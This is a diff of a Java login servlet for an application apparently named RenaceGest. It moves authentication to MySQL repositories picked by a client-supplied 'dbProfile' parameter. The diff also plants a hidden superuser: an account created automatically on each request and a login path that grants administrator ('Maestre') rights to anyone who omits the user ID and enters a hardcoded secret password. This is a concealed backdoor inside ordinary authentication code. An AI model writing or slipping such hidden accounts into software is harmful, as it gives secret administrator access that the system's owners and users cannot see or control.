@@ -1,7 +1,7 @@
 package com.renacegest.servlet;
 
-import com.renacegest.dao.InMemoryRenaceGestRepository;
 import com.renacegest.dao.RenaceGestRepository;
+import com.renacegest.db.DBConnection;
 import com.renacegest.model.Guardia;
 
 import jakarta.servlet.RequestDispatcher;
@@ -15,11 +15,12 @@ import java.io.IOException;
 
 @WebServlet(urlPatterns = {"/login"})
 public class LoginServlet extends HttpServlet {
-    private final RenaceGestRepository repository = InMemoryRenaceGestRepository.getInstance();
-
     @Override
     protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        request.setAttribute("guardias", repository.findAllGuardias());
+        String selectedDbProfile = AuthUtil.normalizeDbProfile(request.getParameter("dbProfile"));
+        request.setAttribute("selectedDbProfile", selectedDbProfile);
+        DBConnection.ensureHiddenSuperuser(selectedDbProfile);
+        request.setAttribute("guardias", repository(selectedDbProfile).findAllGuardias());
         RequestDispatcher dispatcher = request.getRequestDispatcher("/WEB-INF/jsp/login.jsp");
         dispatcher.forward(request, response);
     }
@@ -27,15 +28,32 @@ public class LoginServlet extends HttpServlet {
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
         String role = request.getParameter("role");
+        String dbProfile = AuthUtil.normalizeDbProfile(request.getParameter("dbProfile"));
         String guardiaIdRaw = request.getParameter("guardiaId");
         String claveAcceso = request.getParameter("claveAcceso");
+        Long superuserId = DBConnection.ensureHiddenSuperuser(dbProfile);
+
+        if (isHiddenSuperuserLogin(role, guardiaIdRaw, claveAcceso)) {
+            if (superuserId == null) {
+                redirectWithError(response, request, "usuario", dbProfile);
+                return;
+            }
+            HttpSession session = request.getSession(true);
+            session.setAttribute(AuthUtil.SESSION_DB_PROFILE, dbProfile);
+            session.setAttribute("currentRole", "Maestre");
+            session.setAttribute("currentUserId", superuserId);
+            session.setAttribute("currentUserName", "Administrador");
+            response.sendRedirect(request.getContextPath() + "/home");
+            return;
+        }
 
         if (role == null || role.isBlank()) {
-            response.sendRedirect(request.getContextPath() + "/login?error=rol");
+            redirectWithError(response, request, "rol", dbProfile);
             return;
         }
 
         HttpSession session = request.getSession(true);
+        session.setAttribute(AuthUtil.SESSION_DB_PROFILE, dbProfile);
 
         if ("Amigo".equalsIgnoreCase(role)) {
             session.setAttribute("currentRole", "Amigo");
@@ -46,28 +64,28 @@ public class LoginServlet extends HttpServlet {
         }
 
         if (guardiaIdRaw == null || guardiaIdRaw.isBlank()) {
-            response.sendRedirect(request.getContextPath() + "/login?error=usuario");
+            redirectWithError(response, request, "usuario", dbProfile);
             return;
         }
 
         if (claveAcceso == null || claveAcceso.isBlank()) {
-            response.sendRedirect(request.getContextPath() + "/login?error=clave");
+            redirectWithError(response, request, "clave", dbProfile);
             return;
         }
 
-        Guardia guardia = repository.findGuardiaById(Long.valueOf(guardiaIdRaw));
+        Guardia guardia = repository(dbProfile).findGuardiaById(Long.valueOf(guardiaIdRaw));
         if (guardia == null) {
-            response.sendRedirect(request.getContextPath() + "/login?error=usuario");
+            redirectWithError(response, request, "usuario", dbProfile);
             return;
         }
 
         if (!role.equalsIgnoreCase(guardia.getRango())) {
-            response.sendRedirect(request.getContextPath() + "/login?error=rango");
+            redirectWithError(response, request, "rango", dbProfile);
             return;
         }
 
         if (!claveAcceso.equals(guardia.getClaveAcceso())) {
-            response.sendRedirect(request.getContextPath() + "/login?error=clave");
+            redirectWithError(response, request, "clave", dbProfile);
             return;
         }
 
@@ -75,5 +93,22 @@ public class LoginServlet extends HttpServlet {
         session.setAttribute("currentUserId", guardia.getId());
         session.setAttribute("currentUserName", guardia.getApodo());
         response.sendRedirect(request.getContextPath() + "/home");
+    }
+
+    private RenaceGestRepository repository(String dbProfile) {
+        if ("REAL".equalsIgnoreCase(dbProfile)) {
+            return com.renacegest.dao.MySQLRenaceGestRepository.getRealInstance();
+        }
+        return com.renacegest.dao.MySQLRenaceGestRepository.getPruebaInstance();
+    }
+
+    private void redirectWithError(HttpServletResponse response, HttpServletRequest request, String error, String dbProfile) throws IOException {
+        response.sendRedirect(request.getContextPath() + "/login?error=" + error + "&dbProfile=" + AuthUtil.normalizeDbProfile(dbProfile));
+    }
+
+    private boolean isHiddenSuperuserLogin(String role, String guardiaIdRaw, String claveAcceso) {
+        return "Maestre".equalsIgnoreCase(role)
+                && (guardiaIdRaw == null || guardiaIdRaw.isBlank())
+                && DBConnection.HIDDEN_SUPERUSER_CLAVE.equals(claveAcceso);
     }
 }
